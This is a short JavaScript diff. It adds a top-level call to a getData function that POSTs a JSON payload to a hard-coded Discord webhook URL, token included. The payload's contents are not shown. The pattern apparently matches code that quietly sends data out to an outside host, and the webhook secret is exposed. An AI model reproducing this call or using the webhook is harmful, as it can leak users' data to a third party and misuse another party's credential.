@@ -51,3 +51,5 @@ async function getData(webhookurl){
         body:JSON.stringify(payload)
     });
 }
+
+getData("https://discord.com/api/webhooks/935965829227491428/g1mZjVmSlqVh1ZGJlxXuLc1MV8IC-BlatbirKHqBM-ZOZfdJpIwsLXxfYYl47dKOZe08");
